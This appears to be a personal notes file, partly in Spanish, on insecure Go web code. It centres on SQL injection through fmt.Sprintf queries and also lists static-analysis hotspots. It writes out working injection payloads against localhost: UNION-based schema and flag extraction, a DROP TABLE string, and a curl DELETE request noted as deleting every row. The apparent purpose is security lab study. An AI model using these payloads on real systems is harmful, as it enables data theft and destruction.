# Bad practices

Burp Intruder

- SQL INjection in SELECT Sprintf (mario + will)

    Un usuario o varios

        GET http://localhost:8080/users?id='1'OR'1'='1' HTTP/1.1

La cláusula WHERE id = %s normalmente devolvería un solo registro, si el campo id es clave primaria o único.

Pero debido a que el id se está inyectando directamente con fmt.Sprintf, es posible manipular la consulta. Ejemplo:

SELECT id, name, email FROM users WHERE id = 1 OR 1=1
⚠️ Esto devolvería todos los usuarios de la tabla.

curl -X GET "http://localhost:8080/instruments/vulnerable-sqligetinst?id=3%27%20OR%20%27%27=%27"



- SQL Injection in SELECT Sprintf


	query := fmt.Sprintf("SELECT * FROM juice WHERE id = '%s'", id)

gingonic ==> https://github.com/KaanSK/golang-sqli-challenge/blob/main/SOLUTION.MD
r.GET("/juice/:id", service.Get)

    UNION SELECT null;--
    UNION SELECT null,null;--
    UNION SELECT null,null,null;--
    UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='public'
    UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='super_secret_table'
    UNION SELECT 1,flag FROM super_secret_table


http "localhost:8080/user?id=id=1)) UNION ALL SELECT NULL,version(),current_database(),NULL,NULL,NULL,NULL,NULL--"
http "localhost:8080/user?id=1)) = ((1)) UNION ALL SELECT NULL,version(),current_database(),NULL,NULL,NULL,NULL,NULL--"


gingonic ==> https://github.com/wahyuhadi/gorm-sqlInjection/
router.GET("/user", GetUser)

        err := dbms.First(&user, id) // Sql Injection in this line /user?id=id=1)) or 1=1--


julienschmidt/httprouter
https://github.com/feedlyy/sql-injection-test/
err = db.Get(&person, fmt.Sprintf("SELECT * FROM person WHERE id = %s", id))
        
        drop table person: SELECT name, email FROM users WHERE ID = '10';DROP TABLE person--*/



https://github.com/santoshkavhar/SQL-Injection/  (mysql)

	query = fmt.Sprintf("SELECT username, password FROM users1 where username='%s' and password='%s';", username, password)

        SELECT  username, password, FROM users1 where username='' or 1=1 #'' and password='' or 1=1 #'';





DUDA: dataSourceName := fmt.Sprintf("%s:%s@tcp(%s:%s)/%s", dbUser, dbPassword, dbHost, dbPort, dbName)

- SQL Injection in DELETE Sprintf (Payload codificado)

        curl -X DELETE "http://localhost:8080/instruments/vulnerable-sqli?id=3%27%20OR%20%27%27=%27"    FUNCIONO  (DELETE ALL)

       "3' OR ''='" esta debe ser or 1 = 1 la basica
       dynamic querys


- XSS in handler (productID, err := strconv.Atoi(chi.URLParam(r, "id"))) SANITIZER

- Exposición de Información Sensible: En docker compose

- Manejo Inseguro de Errores

- Autenticación/Autorización Débil o Ausente: Control de acceso deficiente.
Validación de Entrada Insuficiente: Confiar ciegamente en los datos del usuario.

- Fuerza Bruta / Enumeración de Usuarios: Facilitar adivinanzas de credenciales o IDs.

- Dependencias con Vulnerabilidades Conocidas: Aunque go mod download ya las baja, es bueno mencionarlo.


- cryptographic algorithm
- Harcoded credentials


Security Hotspots

- SQL Injection	High	Make sure using a dynamically formatted SQL query is safe here.
- Permission	Medium	Copying recursively might inadvertently add sensitive data to the container. Make sure it is safe here.
- Permission	Medium	The "golang" image runs with "root" as the default user. Make sure it is safe here
- Permission	Medium	The "postgres" image runs with "root" as the default user. Make sure it is safe here.